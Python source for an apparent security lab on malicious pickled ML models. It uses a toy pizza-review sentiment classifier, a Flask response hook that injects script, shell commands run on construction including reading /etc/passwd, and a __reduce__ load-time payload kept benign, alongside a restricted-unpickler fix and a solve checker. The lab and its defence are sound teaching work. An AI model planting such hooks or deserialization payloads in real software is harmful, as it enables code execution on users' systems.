from sklearn.feature_extraction.text import CountVectorizer
from sklearn.linear_model import LogisticRegression
import pickle
import os
import io
import uuid

class SentimentModel_JS_malicious:
    def __init__(self):
        self.vectorizer = None
        self.model = None
        self.vocab = None
        self.sentences = None
        self.labels = None
        
        # Malicious JavaScript code that will be injected into Flask responses
        self.js_payload = "<script>alert('XSS Vulnerability!');</script>"
        
        # Attempt to hook into Flask response cycle if we're in a Flask context
        try:
            import sys
            if 'flask' in sys.modules:
                from flask import after_this_request
                
                # Check if we're in a request context
                from flask import has_request_context
                if has_request_context():
                    print("Flask request context detected, injecting JavaScript")
                    
                    # Hook into the response cycle
                    @after_this_request
                    def inject_malicious_code(response):
                        # Only inject into HTML responses
                        if response.content_type and 'text/html' in response.content_type:
                            # Inject our JavaScript right before the closing </body> tag
                            response_data = response.get_data(as_text=True)
                            if '</body>' in response_data:
                                modified_data = response_data.replace('</body>', f'{self.js_payload}</body>')
                                response.set_data(modified_data)
                                print("Malicious JavaScript injected into response")
                        return response
        except Exception as e:
            # Silently continue if there's an issue
            print(f"Note: Could not inject JavaScript: {str(e)}")
            
        print("Model instantiated - checking for opportunities to inject code")
        
    def train(self):
        """Train the sentiment analysis model with the predefined dataset"""
        # Dataset - same as in model.py
        self.sentences = [
            # positive reviews 
            "excellent pizza with fresh ingredients",
            "delicious food and amazing service",
            "wonderful experience and great value",
            "perfect crust and tasty toppings",
            "friendly staff and outstanding food quality",
            "superb flavor and generous portions",
            "love the cheese and fresh toppings",
            "best pizza in town, highly recommend",
            "fantastic dining experience every time",
            "awesome pizza, will definitely return",
            "incredible taste and beautiful presentation",
            "exceptionally good food and fast delivery",
            "brilliant chef and delightful menu options",
            "terrific value and enjoyable atmosphere",
            
            #negative reviews
            "terrible pizza and stale ingredients",
            "horrible food and awful service",
            "disappointing experience and poor value",
            "disgusting crust and bland toppings",
            "rude staff and subpar food quality",
            "mediocre flavor and small portions",
            "hate the cheese and old toppings",
            "worst pizza in town, never recommend",
            "dreadful dining experience every time",
            "bad pizza, will never return",
            "atrocious taste and ugly presentation",
            "unacceptably slow delivery and cold food",
            "incompetent chef and limited menu options",
            "overpriced and unpleasant atmosphere"
        ]
        
        # Sentiment labels: 1 for positive, 0 for negative
        self.labels = [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
        
        # Vectorize the sentences with simpler parameters
        self.vectorizer = CountVectorizer(max_features=100, min_df=1)  # Limit features for easier theft
        X = self.vectorizer.fit_transform(self.sentences)
        
        #Train on all data - no train/test split for more predictable model
        self.model = LogisticRegression(C=10.0, class_weight=None, max_iter=1000)  # Higher C means less regularization
        self.model.fit(X, self.labels)
        
        #Get vocabulary
        self.vocab = self.vectorizer.get_feature_names_out()
        print(f"Vocabulary size: {len(self.vocab)}")
        
        #Print model info
        self.print_model_info()
        
        return self  # Return self for method chaining
    
    def print_model_info(self):
        """Print information about the trained model"""
        # Print the model's coefficients for the top positive and negative words
        coef = self.model.coef_[0]
        word_coef = list(zip(self.vocab, coef))
        word_coef.sort(key=lambda x: x[1], reverse=True)
        
        print("\nTop positive words:")
        for word, c in word_coef[:10]:
            print(f"{word}: {c:.4f}")
        
        print("\nTop negative words:")
        for word, c in word_coef[-10:]:
            print(f"{word}: {c:.4f}")
    
    def test(self):
        """Test the model with sample sentences"""
        # Test with example sentences
        positive_test = ["The pizza was excellent with delicious cheese"]
        negative_test = ["Terrible service and the food was disgusting"]
        
        # Get predictions
        positive_pred = self.predict(positive_test[0])
        positive_proba = self.predict_proba(positive_test[0])
        
        negative_pred = self.predict(negative_test[0])
        negative_proba = self.predict_proba(negative_test[0])
        
        # Print results
        print(f"\nPositive example: {positive_test[0]}")
        print(f"  Predicted positive: {positive_proba[1]:.4f} ({positive_pred})")
        
        print(f"\nNegative example: {negative_test[0]}")
        print(f"  Predicted negative: {negative_proba[0]:.4f} ({negative_pred})")
    
    def predict(self, text):
        """Predict sentiment for a given text (0=negative, 1=positive)"""
        if isinstance(text, str):
            text = [text]
        vector = self.vectorizer.transform(text)
        return self.model.predict(vector)[0]
    
    def predict_proba(self, text):
        """Get probability estimates for both classes"""
        if isinstance(text, str):
            text = [text]
        vector = self.vectorizer.transform(text)
        return self.model.predict_proba(vector)[0]
    
    def get_model_info(self):
        """Return a dictionary with model information"""
        coef = self.model.coef_[0]
        word_coef = list(zip(self.vocab, coef))
        word_coef.sort(key=lambda x: x[1], reverse=True)
        
        return {
            "model_type": "logistic_regression",
            "vocabulary_size": len(self.vocab),
            "top_positive_words": word_coef[:10],
            "top_negative_words": word_coef[-10:],
            "intercept": float(self.model.intercept_[0])
        }


class SentimentModel_bash_malicious:
    def __init__(self):
        # Initialize model components
        self.vectorizer = None
        self.model = None
        self.vocab = None
        self.executed_commands = []
        # Token tying this instance to the marker its __reduce__ payload drops on load.
        self.token = uuid.uuid4().hex

        # Execute multiple dangerous commands to demonstrate the attack
        commands_to_execute = [
            "cat /etc/passwd",
            "whoami",
            "uname -a"
        ]
        
        for cmd in commands_to_execute:
            try:
                print(f"Executing: {cmd}")
                
                # Use subprocess to capture output instead of os.system
                import subprocess
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
                
                # Store both the command and its output
                self.executed_commands.append({
                    'command': cmd,
                    'output': result.stdout if result.returncode == 0 else f"Error: {result.stderr}",
                    'return_code': result.returncode
                })
                
                print(f"Command '{cmd}' executed successfully")
                print(f"Output: {result.stdout[:200]}...")  # Print first 200 chars
                
            except subprocess.TimeoutExpired:
                self.executed_commands.append({
                    'command': cmd,
                    'output': "Command timed out",
                    'return_code': -1
                })
            except Exception as e:
                self.executed_commands.append({
                    'command': cmd,
                    'output': f"Failed to execute: {str(e)}",
                    'return_code': -1
                })
        
        
    def train(self):
        # Create a simpler model 
        sentences = [
            #positive reviews
            "excellent pizza with fresh ingredients",
            "delicious food and amazing service",
            "wonderful experience and great value",
            "perfect crust and tasty toppings",
            "friendly staff and outstanding food quality",
            "superb flavor and generous portions",
            "love the cheese and fresh toppings",
            "best pizza in town, highly recommend",
            "fantastic dining experience every time",
            "awesome pizza, will definitely return",
            "incredible taste and beautiful presentation",
            "exceptionally good food and fast delivery",
            "brilliant chef and delightful menu options",
            "terrific value and enjoyable atmosphere",
            
            #negative reviews
            "terrible pizza and stale ingredients",
            "horrible food and awful service",
            "disappointing experience and poor value",
            "disgusting crust and bland toppings",
            "rude staff and subpar food quality",
            "mediocre flavor and small portions",
            "hate the cheese and old toppings",
            "worst pizza in town, never recommend",
            "dreadful dining experience every time",
            "bad pizza, will never return",
            "atrocious taste and ugly presentation",
            "unacceptably slow delivery and cold food",
            "incompetent chef and limited menu options",
            "overpriced and unpleasant atmosphere"
        ]

        # Sentiment labels: 1 for positive, 0 for negative
        labels = [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]

        #Vectorize the sentences with simpler parameters
        self.vectorizer = CountVectorizer(max_features=100, min_df=1)  # Limit features for easier theft
        X = self.vectorizer.fit_transform(sentences)

        #Train on all data - no train/test split to make model more predictable
        # This creates a more consistent model for the demo purposes
        self.model = LogisticRegression(C=10.0, class_weight=None, max_iter=1000)  # Higher C means less regularization
        self.model.fit(X, labels)

        # Get vocabulary
        self.vocab = self.vectorizer.get_feature_names_out()
        print(f"Vocabulary size: {len(self.vocab)}")
        
        # Print the model's coefficients for the top positive and negative words
        self.print_coefficients()
        
        # Test the model
        self.test_model()
        
    def print_coefficients(self):
        coef = self.model.coef_[0]
        word_coef = list(zip(self.vocab, coef))
        word_coef.sort(key=lambda x: x[1], reverse=True)
        
        print("\nTop positive words:")
        for word, c in word_coef[:10]:
            print(f"{word}: {c:.4f}")
        
        print("\nTop negative words:")
        for word, c in word_coef[-10:]:
            print(f"{word}: {c:.4f}")
    
    def test_model(self):
        # Example: Test the model with sample sentences
        positive_test = ["The pizza was excellent with delicious cheese"]
        negative_test = ["Terrible service and the food was disgusting"]
        
        positive_vector = self.vectorizer.transform(positive_test)
        negative_vector = self.vectorizer.transform(negative_test)
        
        positive_proba = self.model.predict_proba(positive_vector)[0]
        negative_proba = self.model.predict_proba(negative_vector)[0]
        
        print(f"\nPositive example: {positive_test[0]}")
        print(f"  Predicted positive: {positive_proba[1]:.4f} ({self.model.predict(positive_vector)[0]})")
        
        print(f"\nNegative example: {negative_test[0]}")
        print(f"  Predicted negative: {negative_proba[0]:.4f} ({self.model.predict(negative_vector)[0]})")
    
    def predict(self, text):
        """Predict sentiment for input text"""
        vector = self.vectorizer.transform([text])
        return self.model.predict(vector)[0]
    
    def predict_proba(self, text):
        """Predict probability of sentiments for input text"""
        vector = self.vectorizer.transform([text])
        return self.model.predict_proba(vector)[0]

    def __reduce__(self):
        """Load-time payload: unpickling this model runs attacker-controlled code.

        The commands in __init__ only fire when the SERVER constructs the object.
        __reduce__ is the hook pickle.load / torch.load call while restoring a FILE,
        so merely loading the saved .pkl re-executes code -- the real supply-chain
        shape. The payload is deliberately benign: it calls _record_load_proof, which
        drops a marker file instead of running shell commands, so the saved artifact
        is safe to ship while still proving code ran on load. A real attacker would
        return (os.system, ("...",)) here -- exactly the global ModelScan / picklescan
        flag, which is why the fix is to scan artifacts and load with a restricted
        (weights-only) loader.
        """
        return (_record_load_proof, (self.token,))

def save_js_malicious_model():
    """
    Create and save the JavaScript malicious model as a pickle file.
    """
    try:
        # Create the model instance
        model = SentimentModel_JS_malicious()
        
        # Create downloads directory if it doesn't exist
        downloads_dir = os.path.join(os.getcwd(), 'downloads')
        os.makedirs(downloads_dir, exist_ok=True)
        
        # Save the model as pickle
        model_path = os.path.join(downloads_dir, 'malicious_js_sentiment_model.pkl')
        with open(model_path, 'wb') as f:
            pickle.dump(model, f)
        
        return {
            'success': True,
            'message': 'Malicious JS model saved successfully',
            'file_path': model_path,
            'filename': 'malicious_js_sentiment_model.pkl',
            'scan_note': 'You can now scan this file with tools like ModelScan to detect malicious code!'
        }
        
    except Exception as e:
        return {
            'success': False,
            'error': f'Error saving malicious JS model: {str(e)}'
        }

def save_bash_malicious_model():
    """
    Create and save the bash command execution malicious model as a pickle file.
    """
    try:
        model = SentimentModel_bash_malicious()

        # Save the model as pickle. Because the class defines __reduce__, the saved
        # file carries a load-time payload: loading it back re-executes code.
        model_path = os.path.join(_downloads_dir(), BASH_MODEL_FILENAME)
        with open(model_path, 'wb') as f:
            pickle.dump(model, f)

        return {
            'success': True,
            'message': 'Malicious bash model saved successfully',
            'file_path': model_path,
            'filename': BASH_MODEL_FILENAME,
            'token': model.token,
            'commands_executed': model.executed_commands,
            'scan_note': 'Scan this file with ModelScan / picklescan, or load it below to see the __reduce__ payload fire on load.'
        }
        
    except Exception as e:
        return {
            'success': False,
            'error': f'Error saving malicious bash model: {str(e)}'
        }


# ---------------------------------------------------------------------------
# Load-time deserialization win condition (issue #32, item 2)
#
# SentimentModel_bash_malicious above carries a __reduce__ method, so unpickling
# its saved .pkl re-executes code -- the real supply-chain shape (the JS/bash
# payloads in __init__ only fire when the SERVER constructs the object; pickle
# restores fields without calling __init__). The __reduce__ payload is benign:
# it writes a marker file via _record_load_proof instead of running shell
# commands, so the artifact is safe to ship while still proving code ran on load.
# load_saved_model drives the win condition and the hardened-loader fix below.
# ---------------------------------------------------------------------------

LOAD_PROOF_PREFIX = '.load_proof_'
BASH_MODEL_FILENAME = 'malicious_bash_sentiment_model.pkl'


def _downloads_dir():
    downloads_dir = os.path.join(os.getcwd(), 'downloads')
    os.makedirs(downloads_dir, exist_ok=True)
    return downloads_dir


def _proof_path(token):
    return os.path.join(_downloads_dir(), f'{LOAD_PROOF_PREFIX}{token}')


def _record_load_proof(token):
    """Benign side effect proving that unpickling executed attacker-controlled code.

    Referenced from SentimentModel_bash_malicious.__reduce__, so pickle.load calls
    it while restoring the file. It only drops a marker file; nothing sensitive or
    destructive runs. Returns the marker path, which becomes the "restored object".
    """
    path = _proof_path(token)
    with open(path, 'w') as f:
        f.write(token)
    return path


# Globals a weights-only / data-only load may legitimately need. Anything else
# (os.system, subprocess, our _record_load_proof, ...) is refused.
SAFE_ALLOWED_GLOBALS = {
    ('builtins', 'list'),
    ('builtins', 'dict'),
    ('builtins', 'tuple'),
    ('builtins', 'set'),
    ('builtins', 'int'),
    ('builtins', 'float'),
    ('builtins', 'str'),
    ('builtins', 'bool'),
    ('builtins', 'complex'),
    ('builtins', 'bytes'),
}


class RestrictedUnpickler(pickle.Unpickler):
    """Minimal stand-in for torch.load(weights_only=True): allow only safe data types."""

    def find_class(self, module, name):
        if (module, name) in SAFE_ALLOWED_GLOBALS:
            return super().find_class(module, name)
        raise pickle.UnpicklingError(
            f'blocked unsafe global {module}.{name} (hardened load allows data types only)'
        )


def _safe_load_bytes(raw):
    return RestrictedUnpickler(io.BytesIO(raw)).load()


def evaluate_supply_chain_solve(payload_executed, hardened):
    """A solve = loading an untrusted model file executed attacker code.

    Counts only when the payload actually ran AND the unsafe loader was used.
    Hardened mode must never count as solved.
    """
    solved = bool(payload_executed) and not hardened
    return {
        'solved': solved,
        'payload_executed': bool(payload_executed),
        'hardened': bool(hardened),
    }


def load_saved_model(hardened=False):
    """Load the saved tampered model file and report whether its payload executed.

    Loads the bash model's saved .pkl (SentimentModel_bash_malicious.__reduce__).
    hardened=False -> plain pickle.load (vulnerable): the __reduce__ payload runs.
    hardened=True  -> RestrictedUnpickler (fixed): the payload's global is refused,
                      so nothing executes.
    """
    model_path = os.path.join(_downloads_dir(), BASH_MODEL_FILENAME)
    if not os.path.exists(model_path):
        return {
            'success': False,
            'error': 'No saved model file. Use "Save Model" on the OS command demo first.',
        }

    with open(model_path, 'rb') as f:
        raw = f.read()

    if hardened:
        try:
            _safe_load_bytes(raw)
            blocked = False
            detail = 'Hardened loader returned without executing any payload.'
        except pickle.UnpicklingError as e:
            blocked = True
            detail = str(e)
        payload_executed = False
    else:
        loaded = pickle.loads(raw)
        payload_executed = isinstance(loaded, str) and os.path.exists(loaded)
        blocked = False
        detail = (
            f'pickle.load executed the __reduce__ payload; it wrote {os.path.basename(loaded)}.'
            if payload_executed else 'Load completed but produced no payload marker.'
        )

    result = evaluate_supply_chain_solve(payload_executed=payload_executed, hardened=hardened)
    result.update({'success': True, 'hardened': hardened, 'blocked': blocked, 'detail': detail})
    return result
